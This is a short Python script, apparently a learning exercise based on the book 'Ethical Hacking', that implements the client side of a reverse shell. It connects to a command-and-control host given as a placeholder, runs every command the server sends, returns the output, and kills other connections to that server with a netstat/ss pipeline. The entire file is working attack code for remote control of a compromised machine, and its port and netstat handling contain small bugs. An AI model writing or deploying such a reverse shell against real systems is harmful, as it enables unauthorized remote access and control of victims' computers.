#!/usr/bin/env python3
# Scripted to run on python3

# Author : Bobby Valenzuela
# Created : 10th January 2023

"""
Description: Reverse Shell script (client) as laid out in the book "Ethical Hacking". Made some adjustments of my own as well.
"""

import sys,os
from subprocess import Popen, PIPE
from socket import *

# Guard clause for arguments
# if len(sys.argv) < 2 :
#    print( "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0]) )
#    exit()

serverName = sys.argv[1] if len(sys.argv) > 1 else '<cnc_ip>' # Use CNC (server) ip by default
serverPort = sys.argv[2] if len(sys.argv) > 2 else int('<cnc_port>') # Use port cnc server port by default

print("[CONNECTED] SERVER: {} PORT: {}".format(serverName,serverPort) ) 

# Create client IPv4 (AF_INET) TCPSocket (SOCK_STREAM)
clientSocket = socket(AF_INET, SOCK_STREAM)

# Create IPv6 (AF_INET) UDPSocket (SOCK_DGRAM)
# clientSocket = socket(AF_INET6, SOCK_DGRAM)

# Connect to hacker's machine
clientSocket.connect((serverName,serverPort))

# Send message to server (hacker) that we're ready 
# Must encode msg as python socket library accepts/sends binary
clientSocket.send('Client Connected!'.encode())

# Accept/decode any initial messages (commands) from server (max 4064 bytes)
command = clientSocket.recv(4064).decode()

using_netstat=os.system("{ netstat --version &> /dev/null && echo 1 ; } || echo 0")
net_vs_ss = 'netstat' if using_netstat == 1 else 'ss'

# Continue receiving commands until server sends 'exit
while command != 'exit':
    # Prevent blank commands
    if command != "":
        try:
            # Execute any received commands and parse output (output,err)
            proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
            
            # If command executes - but we can't parse the response - at least show executed it
            try:
                # Send output/err back to server
                result, err = proc.communicate()
                clientSocket.send(result)
            except:
                clientSocket.send("Processesed command - but couldn't parse output.\n".encode())

        except:
            clientSocket.send("Error occurred executing command\n".encode())
    
    # Accept/decode any subsequent commands
    command = (clientSocket.recv(4064)).decode()

    # Get PIDs of any non-established connections to cnc server and kill
    os.system("{} -tupn | egrep -iv 'ESTAB' | egrep '{}:{}' | sed 's/^.*pid=//' | sed 's/,.*//' | xargs kill &> /dev/null".format(net_vs_ss,serverName,serverPort))

clientSocket.close()
